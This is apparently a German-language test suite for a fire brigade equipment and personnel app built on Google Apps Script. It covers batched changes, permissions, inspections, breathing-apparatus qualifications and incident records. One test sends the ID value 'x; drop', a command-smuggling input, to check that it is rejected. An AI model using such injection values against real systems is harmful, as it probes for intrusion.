// ═══════════════════════════════ Gemeinsamer Code ═══════════════════════════════

teil('Gemeinsamer Code: ohne Apps Script, im leeren Kontext dasselbe Ergebnis', () => {
  const a = bereit(true);
  const code = a.lauf('gemeinsamerCode_()');
  const eigene = a.lauf('GEMEINSAM_.map((f) => f.name)');
  // Jeder Aufruf einer `…_`-Funktion muss selbst gemeinsam sein – sonst fehlt sie im Browser.
  const gerufen = [...new Set([...code.matchAll(/\b([A-Za-z0-9]+_)\(/g)].map((m) => m[1]))];
  gleich(gerufen.filter((n) => eigene.indexOf(n) < 0), [], 'keine Serverfunktion im gemeinsamen Code');
  for (const name of ['Utilities', 'SpreadsheetApp', 'Session', 'CacheService', 'PropertiesService', 'Speicher_', 'Vorgang_', 'SCHEMA', 'EINSTELLUNGEN']) {
    pruefe(!new RegExp('\\b' + name + '\\b').test(code.replace(/const VORGABEN_ = .*;/, '')), 'kein ' + name + ' im gemeinsamen Code');
  }
  // In einem Kontext, der nichts kennt als JavaScript selbst, rechnet er wie der Server.
  const leer = vm.createContext({});
  vm.runInContext(code, leer);
  const s = a.stand();
  leer.__stand = JSON.stringify(s);
  const neu = JSON.parse(vm.runInContext('JSON.stringify(ableiten_(JSON.parse(__stand)))', leer));
  for (const k of ['arbeitsliste', 'kennzahlen', 'saetze', 'lagerplaetze', 'personal']) gleich(neu[k], s[k], k + ' im leeren Kontext');
  pruefe(s.personal && s.personal.traeger > 0, 'Demo hat Atemschutzgeräteträger', s.personal);
});

// ═══════════════════════════════ Stapel ═══════════════════════════════

function op(name, args) {
  return { op: crypto.randomUUID(), name: name, args: args };
}

teil('Stapel: der Reihe nach, einzeln festgeschrieben, nie doppelt', () => {
  const a = bereit(true);
  const s = a.stand();
  const pa01 = a.geraet(s, 'PA01');
  const b03 = a.geraet(s, 'B03');
  const lager = a.ort(s, 'LOC-LAGER');
  const buchungen = () => a.blatt('Buchungen').getLastRow();
  const vorher = buchungen();
  const ops = [
    op('betrieb.umlagern', { geraete: [pa01.id], nach: lager.id, grund: a.grund(s, 'Übung').id }),
    op('betrieb.gereinigt', { geraet: b03.id }),
    op('betrieb.statusSetzen', { geraete: [b03.id], status: 'zur_pruefung' }),
  ];
  const r = a.rufe(a.admin, 'stapel', { ops: ops });
  pruefe(r.ok && r.stand, 'Antwort mit Stand', r);
  gleich(r.ergebnis.map((x) => x.ok), [true, false, true], 'jede Änderung für sich');
  pruefe(/zu reinigen/.test(r.ergebnis[1].fehler), 'Begründung der abgelehnten', r.ergebnis[1]);
  gleich(a.geraet(r.stand, 'PA01').lagerplatz_id, lager.id, 'die erste gilt');
  gleich(a.geraet(r.stand, 'B03').status, 'zur_pruefung', 'die dritte gilt – trotz der zweiten');
  gleich(buchungen(), vorher + 1, 'eine Buchung');
  // Die Antwort ist verloren gegangen, der Browser schickt alles noch einmal.
  const wieder = a.rufe(a.admin, 'stapel', { ops: ops });
  gleich(wieder.ergebnis.map((x) => !!x.wiederholt), [true, false, true], 'Gespeichertes wird erkannt, Abgelehntes neu geprüft');
  gleich(buchungen(), vorher + 1, 'keine zweite Buchung');
  // Selbst wenn der Zwischenspeicher geräumt ist: Eine Anlage erkennt ihre eigene Kennung.
  const neuId = crypto.randomUUID();
  const typ = op('typen.speichern', { neu_id: neuId, name: 'Hebekissen' });
  gleich(a.rufe(a.admin, 'stapel', { ops: [typ] }).ergebnis[0], { op: typ.op, ok: true, ergebnis: { id: neuId } }, 'Anlage unter der Kennung des Browsers');
  a.cache.clear ? a.cache.clear() : [...a.cache.keys()].forEach((k) => a.cache.delete(k));
  const nochmal = a.rufe(a.admin, 'stapel', { ops: [typ] }).ergebnis[0];
  pruefe(nochmal.ok && nochmal.wiederholt && nochmal.ergebnis.id === neuId, 'zweite Anlage derselben Kennung: schon da, kein Fehler', nochmal);
  gleich(a.stand().typen.filter((t) => t.name === 'Hebekissen').length, 1, 'nur einmal angelegt');
  const kaputt = a.rufe(a.admin, 'stapel', { ops: [op('typen.speichern', { neu_id: 'x; drop', name: 'X' })] }).ergebnis[0];
  pruefe(!kaputt.ok && /Ungültige Kennung/.test(kaputt.fehler), 'nur UUIDs als Kennung', kaputt);
});

teil('Stapel: dieselben Rechte wie ein einzelner Aufruf', () => {
  const a = bereit(true);
  const carla = a.mitglied('carla', 'mitglied');
  const s = a.stand(carla);
  const pa01 = a.geraet(s, 'PA01');
  const r = a.rufe(carla, 'stapel', { ops: [
    op('geraete.speichern', { id: pa01.id, bemerkung: 'x' }),
    op('betrieb.umlagern', { geraete: [pa01.id], nach: a.ort(s, 'LOC-HALLE').id, grund: a.grund(s, 'Übung').id }),
    op('daten.laden', {}),
    op('halle.anmelden', {}),
    op('erfunden', {}),
  ] });
  gleich(r.ergebnis.map((x) => x.ok ? 'ok' : x.code), ['verboten', 'ok', 'fehler', 'fehler', 'fehler'], 'Rolle, Lesen, Öffentliches, Unbekanntes');
  pruefe(/Gehört nicht in einen Stapel/.test(r.ergebnis[2].fehler), 'Lesen gehört nicht hinein', r.ergebnis[2]);
  pruefe(!a.rufe(null, 'stapel', { ops: [] }).ok, 'ohne Konto kein Stapel');
  pruefe(!a.rufe(a.admin, 'stapel', { ops: new Array(51).fill(0).map(() => op('typen.speichern', { name: 'x' })) }).ok, 'höchstens 50 auf einmal');
  // Belegte Sperre: Der Browser muss wissen, dass er es einfach noch einmal versuchen kann.
  const lock = a.ctx.LockService.getScriptLock;
  a.ctx.LockService.getScriptLock = () => ({ tryLock: () => false, releaseLock() {} });
  const besetzt = a.rufe(a.admin, 'stapel', { ops: [op('typen.speichern', { name: 'Y' })] });
  a.ctx.LockService.getScriptLock = lock;
  pruefe(!besetzt.ok && besetzt.code === 'gesperrt', 'belegte Sperre: „gesperrt“, nichts geschrieben', besetzt);
});

/**
 * Was der Browser nach einer Änderung anzeigt, bevor der Server antwortet – und was der
 * Server danach schickt. Verglichen wird, was man sieht: Standorte, Status, Termine,
 * Arbeitsliste, Kennzahlen, Satzstand, Atemschutz. Nicht verglichen: Zeitstempel und
 * Codes, die erst der Server vergibt.
 */
function sichtbar(d) {
  const ohne = (o, felder) => {
    const x = {};
    Object.keys(o).sort().forEach((k) => {
      if (felder.indexOf(k) < 0 && !/_am$/.test(k)) x[k] = o[k];
    });
    return x;
  };
  const nach = (liste, schluessel, felder) => liste.map((o) => [schluessel(o), ohne(o, felder || [])]).sort((x, y) => (x[0] < y[0] ? -1 : 1));
  const standSchluessel = (s) => s.geraet_id + '/' + s.pruefplan_id;
  return {
    geraete: nach(d.geraete, (g) => g.id, ['barcode']),
    stand: nach(d.stand, standSchluessel, ['id']),
    plaene: nach(d.plaene, (p) => p.id),
    schritte: nach(d.schritte, (x) => x.pruefplan_id + '/' + x.position, ['id']),
    lagerplaetze: nach(d.lagerplaetze, (l) => l.id, ['code', 'zuletzt_gezaehlt']).concat([['gezaehlt', d.lagerplaetze.filter((l) => l.zuletzt_gezaehlt).map((l) => l.id).sort()]]),
    typen: nach(d.typen, (t) => t.id),
    gruende: nach(d.gruende, (g) => g.id),
    satzarten: nach(d.satzarten, (x) => x.id),
    satzteile: nach(d.satzteile, (t) => t.satzart_id + '/' + t.geraetetyp_id, ['id']),
    saetze: nach(d.saetze, (x) => x.id, ['barcode']),
    regeln: nach(d.regeln, (r) => r.id),
    mitglieder: nach(d.mitglieder, (m) => m.id),
    einstellungen: d.einstellungen,
    wehr: d.wehr,
    arbeitsliste: d.arbeitsliste.map((x) => [x.art, x.geraet_id, x.plan_id, x.faellig, x.tage, x.werkstatt].join('|')).sort(),
    kennzahlen: d.kennzahlen,
    offen: d.inventurenOffen.map((i) => i.lagerplatz_id).sort(),
    qualiarten: d.qualiarten ? nach(d.qualiarten, (q) => q.id) : null,
    nachweise: d.nachweise ? nach(d.nachweise, (n) => n.id) : null,
    personal: d.personal ? Object.assign({}, d.personal) : null,
    einsaetze: d.einsaetze ? nach(d.einsaetze, (e) => e.id) : null,
    einsatzkraefte: d.einsatzkraefte ? nach(d.einsatzkraefte, (k) => k.id) : null,
    einsatzArchiv: d.einsatzArchiv || null,
    atemschutzVorher: d.atemschutzVorher || null,
    einsatzZeitraum: d.einsatzZeitraum || null,
  };
}

teil('Vorhersage im Browser = Ergebnis auf dem Server', () => {
  const a = bereit(true);
  const browser = browserKontext(a.lauf('gemeinsamerCode_()'));
  const s0 = a.stand();
  const g = (bez) => a.geraet(a.stand(), bez).id;
  const ort = (code) => a.ort(s0, code).id;
  const grund = (name) => a.grund(s0, name).id;
  const typ = (name) => s0.typen.find((t) => t.name === name).id;
  const plan = (typName, name) => s0.plaene.find((p) => p.geraetetyp_id === typ(typName) && p.name === name).id;
  const mitglied = (name) => a.stand().mitglieder.find((m) => m.name === name).id;
  const art = (anfang) => s0.qualiarten.find((q) => q.name.indexOf(anfang) === 0).id;
  const satz = (name) => s0.saetze.find((x) => x.name === name).id;
  const neu = () => crypto.randomUUID();
  const typNeu = neu();
  const planNeu = neu();
  const geraetNeu = neu();
  const gangNeu = neu();
  const satzartNeu = neu();
  const kellerNeu = neu();
  const kellerZweit = neu();
  const kraftNeu = neu();
  const vor = (tage, stunde) => {
    const d = new Date(Date.now() - tage * 86400000);
    d.setHours(stunde, 0, 0, 0);
    return d.toISOString();
  };
  const tagebuchKraefte = () => [
    { neu_id: neu(), art: 'person', mitglied_id: mitglied('Paul Pumpe'), name: 'Paul Pumpe', von: vor(2, 20), bis: vor(2, 21), atemschutz: true, funktion: 'Angriffstrupp' },
    { neu_id: neu(), art: 'person', mitglied_id: mitglied('Tom Leiter'), name: 'Tom Leiter', von: vor(2, 20), bis: vor(2, 22), atemschutz: false, funktion: 'Gruppenführer' },
    { neu_id: neu(), art: 'person', mitglied_id: null, name: 'Gerda Gast (DRK)', von: vor(2, 20), bis: vor(2, 21), atemschutz: false, funktion: '' },
    { neu_id: neu(), art: 'mittel', mitglied_id: null, name: 'LF 10', von: vor(2, 20), bis: vor(2, 22), atemschutz: true, funktion: '' },
  ];
  const abschrift = [{ liste: 'tagebuch', zeit: vor(2, 20), text: 'Alarm' }, { liste: 'tagebuch', zeit: vor(2, 21), text: 'Feuer aus', geloescht: true, vorher: ['Feuer'] }, { liste: 'kraefte', zeit: vor(2, 20), text: 'LF 10', aktion: 'eingesetzt' }];
  const faelle = [
    ['Einsatz: zu reinigen, Regel stellt Prüfung fällig', () => ['betrieb.umlagern', { geraete: [g('PA01'), g('M01'), g('B03')], nach: ort('LOC-WERK'), grund: grund('Einsatz') }]],
    ['Übung: einsatzbereit, Defektes bleibt defekt', () => ['betrieb.umlagern', { geraete: [g('PA02'), g('B03')], nach: ort('LOC-LF10'), grund: grund('Übung') }]],
    ['Gereinigt', () => ['betrieb.gereinigt', { geraet: g('M02') }]],
    ['Status mit Notiz', () => ['betrieb.statusSetzen', { geraete: [g('C01'), g('C02')], status: 'defekt', bemerkung: 'Kupplung undicht' }]],
    ['Prüfung bestanden: Termin rückt, Werkstatt entlassen', () => ['pruefungen.erfassen', { neu_id: neu(), geraet: g('LA03'), plan: plan('Lungenautomat', 'Halbjahresprüfung'), ergebnis: 'bestanden', datum: s0.heute }]],
    ['Prüfung nicht bestanden: Regel „defekt“', () => ['pruefungen.erfassen', { neu_id: neu(), geraet: g('B01'), plan: plan('B-Druckschlauch', 'Druckprüfung'), ergebnis: 'nicht_bestanden' }]],
    ['Abweichendes Intervall', () => ['faelligkeit.aendern', { id: a.stand().stand.find((x) => x.geraet_id === g('FL02')).id, abw_wert: 2, abw_einheit: 'jahre' }]],
    ['Neuer Gerätetyp', () => ['typen.speichern', { neu_id: typNeu, name: 'Hebekissen', hersteller: 'Vetter' }]],
    ['Neuer Plan verteilt sich', () => ['plaene.speichern', { neu_id: planNeu, geraetetyp_id: typ('Feuerwehrhelm'), name: 'Sichtprüfung', intervall_wert: 1, intervall_einheit: 'jahre' }]],
    ['Intervall korrigiert: Termine folgen', () => ['plaene.speichern', { id: plan('Atemluftflasche', 'Sichtprüfung'), intervall_wert: 2, intervall_einheit: 'jahre' }]],
    ['Prüfschritte ersetzen', () => ['schritte.speichern', { plan_id: planNeu, schritte: [{ neu_id: neu(), titel: 'Schale', art: 'haken', pflicht: true }, { neu_id: neu(), titel: 'Visier', art: 'messwert', einheit: 'mm', pflicht: false }] }]],
    ['Neues Gerät mit Terminen', () => ['geraete.speichern', { neu_id: geraetNeu, geraetetyp_id: typ('Feuerwehrhelm'), lagerplatz_id: ort('LOC-MTW'), bezeichnung: 'HELM04', status: 'einsatzbereit' }]],
    ['Typwechsel: Termine wechseln', () => ['geraete.speichern', { id: geraetNeu, geraetetyp_id: typ('Feuerlöscher') }]],
    ['Lagerplatz', () => ['lagerplaetze.speichern', { neu_id: neu(), name: 'Anhänger', typ: 'fahrzeug', ober_id: ort('LOC-HALLE') }]],
    ['Gründe umsortieren', () => ['gruende.verschieben', { id: grund('Umräumen'), richtung: -1 }]],
    ['Gerät in einen anderen Satz', () => ['saetze.hinzufuegen', { satz: satz('AS-Satz 3'), geraete: [g('LA04'), g('FL05')] }]],
    ['Gerät aus dem Satz', () => ['saetze.entfernen', { satz: satz('AS-Satz 1'), geraete: [g('FL02')] }]],
    ['Satzart mit Teilen', () => ['satzarten.speichern', { neu_id: satzartNeu, name: 'Schlauchpaket', teile: [{ geraetetyp_id: typ('B-Druckschlauch'), min_anzahl: 2, max_anzahl: 2 }, { geraetetyp_id: typ('C-Druckschlauch'), min_anzahl: 1, max_anzahl: 3 }] }]],
    ['Satz nach Vorlage', () => ['saetze.speichern', { neu_id: neu(), name: 'Paket 1', satzart_id: satzartNeu }]],
    ['Vorwarnzeit ändern', () => ['einstellungen.speichern', { werte: { vorwarnung_pruefung_tage: '90', vorwarnung_personal_tage: '30', wehr_zusatz: '' } }]],
    ['Regel ändern', () => ['regeln.speichern', Object.assign({}, a.stand().regeln[0], { aktiv: false })]],
    ['Zählgang beginnen', () => ['inventur.beginnen', { lagerplatz: ort('LOC-MTW'), neu_id: gangNeu }]],
    ['Zählgang abschließen: fremd geradegebucht, Fehlendes vermisst', () => ['inventur.abschliessen', { id: gangNeu, gefunden: [g('PG01'), g('HELM03')], korrigieren: true, vermisst: true }]],
    ['G26.3 erneuert', () => ['nachweise.speichern', { neu_id: neu(), mitglied_id: mitglied('Tom Leiter'), art_id: art('G26.3'), erworben_am: s0.heute }]],
    ['Einsatztagebuch übernommen: Kräfte, Gast, Fahrzeug, Nachweis unter Atemschutz', () => ['einsaetze.speichern', {
      neu_id: kellerNeu, art: 'einsatz', bezeichnung: 'Kellerbrand Mühlweg 3', nummer: 'E-131', stichwort: 'B2', ort: 'Mühlweg 3', einsatzleiter: 'Tom Leiter',
      beginn: vor(2, 20), ende: vor(2, 22), bericht: '', quelle: 'einsatztagebuch', quelle_kennung: 'tagebuch:' + vor(2, 20), kraefte: tagebuchKraefte(), tagebuch: abschrift }]],
    ['Dasselbe Tagebuch noch einmal: ersetzt', () => ['einsaetze.speichern', {
      neu_id: kellerZweit, ersetzt: kellerNeu, art: 'einsatz', bezeichnung: 'Kellerbrand Mühlweg 3', beginn: vor(2, 20), ende: vor(2, 22),
      quelle: 'einsatztagebuch', quelle_kennung: 'tagebuch:' + vor(2, 20), kraefte: tagebuchKraefte().slice(1), tagebuch: abschrift }]],
    ['Bericht geschrieben, Ende berichtigt', () => ['einsaetze.speichern', { id: kellerZweit, bericht: 'Lage: Rauch aus dem Keller.\nMaßnahmen: ein Trupp unter PA.  ', ende: vor(2, 23) }]],
    ['Einsatzkraft nachgetragen – unter Atemschutz', () => ['einsatzkraefte.speichern', { neu_id: kraftNeu, einsatz_id: kellerZweit, art: 'person', mitglied_id: mitglied('Paul Pumpe'), von: vor(2, 20), bis: vor(2, 21), atemschutz: true }]],
    ['Einsatzkraft: doch nicht unter Atemschutz, und Gast statt Mitglied', () => ['einsatzkraefte.speichern', { id: kraftNeu, mitglied_id: '', name: 'Paula Pumpe (Gast)', atemschutz: false }]],
    ['Übung von Hand, mit Teilnehmern', () => ['einsaetze.speichern', { neu_id: neu(), art: 'uebung', bezeichnung: 'Übung Leitern', beginn: vor(1, 18), ende: vor(1, 20),
      kraefte: [{ neu_id: neu(), art: 'person', mitglied_id: mitglied('Jana Schaum'), von: vor(1, 18), bis: vor(1, 20), atemschutz: true }] }]],
    ['Älterer Einsatz nachgetragen: nur Jahr und Atemschutz im Stand', () => ['einsaetze.speichern', { neu_id: neu(), art: 'einsatz', bezeichnung: 'Scheunenbrand', beginn: vor(1200, 10), ende: vor(1200, 13),
      kraefte: [{ neu_id: neu(), art: 'person', mitglied_id: mitglied('Paul Pumpe'), von: vor(1200, 10), bis: vor(1200, 13), atemschutz: true }] }]],
    ['Einsatzkraft herausgenommen', () => ['einsatzkraefte.loeschen', { id: a.stand().einsatzkraefte.find((k) => k.einsatz_id === kellerZweit && k.name === 'Tom Leiter').id }]],
    ['Qualifikation folgt nicht mehr aus Einsätzen', () => ['qualiarten.speichern', { id: art('Einsatz oder Übung'), aus_einsatz: false }]],
    ['… und wieder', () => ['qualiarten.speichern', { id: art('Einsatz oder Übung'), aus_einsatz: true }]],
    ['Bericht gelöscht: Kräfte und Nachweis gehen mit', () => ['einsaetze.loeschen', { id: a.stand().einsaetze.find((e) => e.bezeichnung === 'Atemschutzübung Werkhalle').id }]],
    ['Belastungsübung keine Voraussetzung mehr', () => ['qualiarten.speichern', { id: art('Belastungsübung'), atemschutz: false }]],
    ['Mitglied aufnehmen', () => ['mitglieder.speichern', { neu_id: neu(), name: 'Eva Eimer', email: 'Eva@FF.example', kuerzel: 'ee', rolle: 'kommandant' }]],
    ['Mitglied entfernen: Nachweise gehen mit', () => ['mitglieder.loeschen', { id: mitglied('Jana Schaum') }]],
    ['Prüfplan löschen', () => ['plaene.loeschen', { id: planNeu }]],
    ['Satz auflösen', () => ['saetze.loeschen', { id: satz('AS-Satz 4') }]],
  ];
  for (const [titel, fall] of faelle) {
    const [name, args] = fall();
    const vorher = a.stand();
    const vorhersage = browser.vorhersage(vorher, name, args);
    const r = a.rufe(a.admin, 'stapel', { ops: [op(name, args)] });
    if (!r.ok || !r.ergebnis[0].ok) {
      pruefe(false, titel + ': Server lehnt ab', r.ergebnis ? r.ergebnis[0] : r);
      continue;
    }
    const ist = sichtbar(vorhersage.d);
    const soll = sichtbar(r.stand);
    const abweichend = Object.keys(soll).filter((k) => JSON.stringify(ist[k]) !== JSON.stringify(soll[k]));
    pruefe(!abweichend.length, titel + ': Vorhersage weicht ab in ' + abweichend.join(', '),
      abweichend.length ? { browser: ist[abweichend[0]], server: soll[abweichend[0]] } : undefined);
    if (name === 'betrieb.umlagern' || name === 'inventur.abschliessen') {
      const v = vorhersage.vorschau;
      const e = r.ergebnis[0].ergebnis;
      const felder = name === 'betrieb.umlagern' ? ['gebucht', 'schonDa'] : ['gefunden', 'fehlt', 'fremd', 'vermisstGebucht'];
      gleich(felder.map((f) => v[f]), felder.map((f) => e[f]), titel + ': dieselbe Meldung');
    }
  }
  // Was der Browser schon vorher ablehnt, lehnt er mit der Meldung des Servers ab.
  const s = a.stand();
  const vorab = (name, args) => {
    try {
      browser.vorhersage(s, name, args);
      return null;
    } catch (e) {
      return e.message;
    }
  };
  const server = (name, args) => a.rufe(a.admin, name, args).fehler;
  for (const [name, args] of [
    ['typen.speichern', { neu_id: neu(), name: 'pressluftatmer' }],
    ['typen.loeschen', { id: typ('Pressluftatmer') }],
    ['lagerplaetze.loeschen', { id: ort('LOC-LF10') }],
    ['satzarten.loeschen', { id: s.satzarten[0].id }],
    ['mitglieder.loeschen', { id: s.ich.id }],
    ['mitglieder.speichern', { neu_id: neu(), name: 'X', email: 'kaputt', rolle: 'mitglied' }],
    ['betrieb.gereinigt', { geraet: g('PA04') }],
    ['einstellungen.speichern', { werte: { vorwarnung_pruefung_tage: '0' } }],
    ['nachweise.speichern', { neu_id: neu(), mitglied_id: mitglied('Max Brenner'), art_id: art('G26.3'), erworben_am: '2999-01-01' }],
    ['qualiarten.loeschen', { id: art('G26.3') }],
    ['faelligkeit.aendern', { id: s.stand[0].id, abw_wert: 3 }],
    ['einsaetze.speichern', { neu_id: neu(), art: 'einsatz', bezeichnung: ' ', beginn: vor(1, 10) }],
    ['einsaetze.speichern', { neu_id: neu(), art: 'einsatz', bezeichnung: 'X', beginn: vor(1, 10), ende: vor(1, 9) }],
    ['einsaetze.speichern', { neu_id: neu(), art: 'feier', bezeichnung: 'X', beginn: vor(1, 10) }],
    ['einsaetze.speichern', { neu_id: neu(), art: 'einsatz', bezeichnung: 'X', beginn: vor(1, 10), quelle_kennung: s.einsaetze.find((e) => e.quelle_kennung).quelle_kennung }],
    ['einsaetze.speichern', { neu_id: neu(), art: 'einsatz', bezeichnung: 'X', beginn: vor(1, 10), kraefte: [{ neu_id: neu(), art: 'person', name: 'Y', von: vor(1, 11), bis: vor(1, 10) }] }],
    ['einsatzkraefte.speichern', { neu_id: neu(), einsatz_id: kellerZweit, art: 'mittel', name: '', von: vor(1, 10), bis: vor(1, 11) }],
    ['einsatzkraefte.speichern', { neu_id: neu(), einsatz_id: kellerZweit, art: 'person', name: 'Z', von: vor(10, 10), bis: vor(1, 11) }],
  ]) {
    const b = vorab(name, args);
    pruefe(b && b === server(name, args), name + ': im Browser abgelehnt wie auf dem Server', { browser: b, server: server(name, args) });
  }
});

// ═══════════════════════════════ Personal ═══════════════════════════════

teil('Personal: wer was sieht und darf', () => {
  const a = bereit(true);
  const carla = a.mitglied('carla', 'mitglied');
  const ben = a.mitglied('ben', 'geraetewart');
  const dora = a.mitglied('dora', 'kommandant');
  const verboten = (wer, name, args) => {
    const r = a.rufe(wer, name, args);
    return !r.ok && r.code === 'verboten';
  };
  const sc = a.stand(carla);
  pruefe(!('nachweise' in sc) && !('qualiarten' in sc) && sc.personal === null, 'Mitglied bekommt keine Personaldaten', Object.keys(sc));
  const sb = a.stand(ben);
  const sd = a.stand(dora);
  pruefe(sb.nachweise.length > 0 && sd.nachweise.length === sb.nachweise.length, 'Gerätewart und Kommandant sehen die Nachweise');
  const tom = sb.mitglieder.find((m) => m.name === 'Tom Leiter').id;
  const g26 = sb.qualiarten.find((q) => q.name.indexOf('G26.3') === 0).id;
  pruefe(verboten(carla, 'nachweise.speichern', { mitglied_id: tom, art_id: g26, erworben_am: sb.heute }), 'Mitglied: keine Nachweise');
  pruefe(verboten(carla, 'personal.pdf', {}), 'Mitglied: keine Atemschutzliste');
  pruefe(a.rufe(ben, 'nachweise.speichern', { mitglied_id: tom, art_id: g26, erworben_am: sb.heute }).ok, 'Gerätewart erfasst die G26.3');
  pruefe(verboten(ben, 'qualiarten.speichern', { name: 'Funk' }), 'Gerätewart legt keine Arten fest');
  pruefe(a.rufe(dora, 'qualiarten.speichern', { name: 'Sprechfunker' }).ok, 'Kommandant legt Arten fest');
  pruefe(a.rufe(dora, 'personal.pdf', {}).ok, 'Kommandant: Atemschutzliste');
  pruefe(a.rufe(dora, 'protokoll.lesen', {}).ok, 'Kommandant liest das Protokoll');
  const pa01 = a.geraet(sd, 'PA01');
  pruefe(verboten(dora, 'geraete.speichern', { id: pa01.id, bemerkung: 'x' }), 'Kommandant: Technik nur lesen');
  pruefe(verboten(dora, 'pruefungen.erfassen', {}), 'Kommandant: keine Prüfung');
  pruefe(verboten(dora, 'mitglieder.speichern', { name: 'x', email: 'x@ff.example', rolle: 'mitglied' }), 'Kommandant: Mitglieder bleiben beim Administrator');
  pruefe(a.rufe(dora, 'betrieb.umlagern', { geraete: [pa01.id], nach: a.ort(sd, 'LOC-HALLE').id, grund: a.grund(sd, 'Übung').id }).ok, 'Kommandant bucht wie jedes Mitglied');
  // Am Hallengerät – auch mit dem Kürzel des Gerätewarts – keine Personaldaten.
  a.ok(a.admin, 'hallengeraet.anmelden', { name: 'Tablet', geteilt: true, abmelden_nach_min: 3, geheimnis: 'G'.repeat(40) });
  a.setzeNutzer(a.hallenkonto);
  const token = JSON.parse(a.ctx.aufruf(null, 'halle.anmelden', { geraet: 'G'.repeat(40), code: 'ben' })).ergebnis.token;
  const halle = a.rufe(token, 'daten.laden').ergebnis;
  pruefe(halle.ich.rolle === 'geraetewart' && !('nachweise' in halle), 'Hallensitzung des Gerätewarts: keine Nachweise');
  pruefe(verboten(token, 'nachweise.speichern', { mitglied_id: tom, art_id: g26, erworben_am: sb.heute }), 'am Hallengerät keine Nachweise');
  // Ausgeschaltet: nichts davon, für niemanden.
  a.ok(a.admin, 'einstellungen.speichern', { werte: { modul_personal: 'nein' } });
  const aus = a.stand(ben);
  pruefe(!('nachweise' in aus) && aus.module.personal === false, 'Modul aus: keine Personaldaten');
  const r = a.rufe(ben, 'nachweise.speichern', { mitglied_id: tom, art_id: g26, erworben_am: sb.heute });
  pruefe(!r.ok && /ausgeschaltet/.test(r.fehler), 'Modul aus: kein Nachweis', r);
});

teil('Personal: aktueller Nachweis, Atemschutz, Ablauf', () => {
  const a = bereit(true);
  const s = a.stand();
  const p = s.personal;
  const id = (name) => s.mitglieder.find((m) => m.name === name).id;
  const art = (anfang) => s.qualiarten.find((q) => q.name.indexOf(anfang) === 0).id;
  gleich(['Max Brenner', 'Lena Wasser', 'Tom Leiter', 'Sven Funke', 'Jana Schaum', 'Paul Pumpe', 'Anna Admin'].map((n) => p.atemschutz[id(n)]),
    ['tauglich', 'tauglich', 'abgelaufen', 'tauglich', 'unvollstaendig', 'keiner', 'keiner'], 'jeder Zustand einmal');
  gleich([p.tauglich, p.traeger, p.abgelaufen, p.bald], [3, 5, 1, 2], 'Kennzahlen');
  // Sven hat verlängert: Der alte Nachweis ist Beleg, nicht Aussage.
  const sven = s.nachweise.filter((n) => n.mitglied_id === id('Sven Funke') && n.art_id === art('G26.3'));
  gleich(sven.length, 2, 'zwei G26.3 bei Sven');
  gleich(sven.map((n) => !!p.aktuell[n.id]).sort(), [false, true], 'nur einer davon zählt');
  pruefe(!p.faellig.some((f) => f.mitglied_id === id('Sven Funke') && f.art_id === art('G26.3')), 'der ersetzte steht nicht in der Aktionsliste');
  // Tom erneuert – „gültig bis“ aus der Art, wenn es niemand angibt.
  const r = a.ok(a.admin, 'nachweise.speichern', { mitglied_id: id('Tom Leiter'), art_id: art('G26.3'), erworben_am: s.heute }).stand;
  const neu = r.nachweise.find((n) => n.mitglied_id === id('Tom Leiter') && n.erworben_am === s.heute);
  gleich(neu.gueltig_bis, a.lauf(`datumPlus_('${s.heute}', 36, 'monate')`), 'gültig bis: 36 Monate');
  gleich(r.personal.atemschutz[id('Tom Leiter')], 'tauglich', 'Tom wieder tauglich');
  gleich(r.personal.abgelaufen, 0, 'nichts mehr abgelaufen');
  // Prüfungen am Eingang
  const fehler = (args) => a.rufe(a.admin, 'nachweise.speichern', Object.assign({ mitglied_id: id('Paul Pumpe'), art_id: art('G26.3'), erworben_am: s.heute }, args)).fehler;
  pruefe(/Zukunft/.test(fehler({ erworben_am: '2999-01-01' })), 'nicht in der Zukunft erworben');
  pruefe(/vor dem Erwerb/.test(fehler({ gueltig_bis: '2000-01-01' })), 'gültig bis nicht vor dem Erwerb');
  pruefe(/läuft ab/.test(fehler({ gueltig_bis: '' })), 'befristete Art braucht ein Ablaufdatum');
  a.ok(a.admin, 'qualiarten.speichern', { id: art('Maschinist'), aktiv: false });
  pruefe(/stillgelegt/.test(fehler({ art_id: art('Maschinist') })), 'stillgelegte Art nicht neu erfassen');
  const loeschen = a.rufe(a.admin, 'qualiarten.loeschen', { id: art('G26.3') });
  pruefe(!loeschen.ok && /statt zu löschen bitte stilllegen/.test(loeschen.fehler), 'Art mit Nachweisen bleibt', loeschen);
  // Ohne Belastungsübung als Voraussetzung ist Jana tauglich.
  const ohne = a.ok(a.admin, 'qualiarten.speichern', { id: art('Belastungsübung'), atemschutz: false }).stand;
  gleich(ohne.personal.atemschutz[id('Jana Schaum')], 'tauglich', 'Voraussetzung abgewählt: Jana tauglich');
  // Mit der Person gehen ihre Nachweise.
  const vorher = ohne.nachweise.length;
  const nachher = a.ok(a.admin, 'mitglieder.loeschen', { id: id('Lena Wasser') }).stand.nachweise.length;
  gleich(nachher, vorher - 3, 'Lenas drei Nachweise gelöscht');
  const prot = a.protokoll().filter((z) => z.objekt_art === 'nachweise');
  pruefe(prot.some((z) => z.aktion === 'anlegen' && z.objekt_text === 'G26.3 – Atemschutztauglichkeit · Tom Leiter'), 'im Protokoll: Art · Person', prot.slice(-3));
  const pdf = a.ok(a.admin, 'personal.pdf', {}).ergebnis;
  const html = Buffer.from(pdf.base64, 'base64').toString('utf8');
  pruefe(/Atemschutz/.test(html) && html.indexOf('Tom Leiter') > 0 && html.indexOf('Paul Pumpe') < 0, 'Atemschutzliste: Träger ja, Nicht-Träger nein');
});

// ═══════════════════════════════ Einsätze ═══════════════════════════════

teil('Einsätze: wer was sieht und darf', () => {
  const a = bereit(true);
  const carla = a.mitglied('carla', 'mitglied');
  const ben = a.mitglied('ben', 'geraetewart');
  const dora = a.mitglied('dora', 'kommandant');
  const verboten = (wer, name, args) => {
    const r = a.rufe(wer, name, args);
    return !r.ok && r.code === 'verboten';
  };
  const sc = a.stand(carla);
  pruefe(!('einsaetze' in sc) && !('einsatzkraefte' in sc) && !('atemschutzVorher' in sc), 'Mitglied: keine Einsätze im Stand', Object.keys(sc));
  const sb = a.stand(ben);
  const brand = sb.einsaetze.find((e) => e.bezeichnung === 'Wohnungsbrand Lindenstraße 12');
  const neu = { art: 'uebung', bezeichnung: 'Übung', beginn: new Date().toISOString() };
  pruefe(verboten(carla, 'einsaetze.speichern', neu), 'Mitglied: keine Berichte');
  pruefe(verboten(carla, 'einsaetze.tagebuch', { id: brand.id }), 'Mitglied: keine Abschrift');
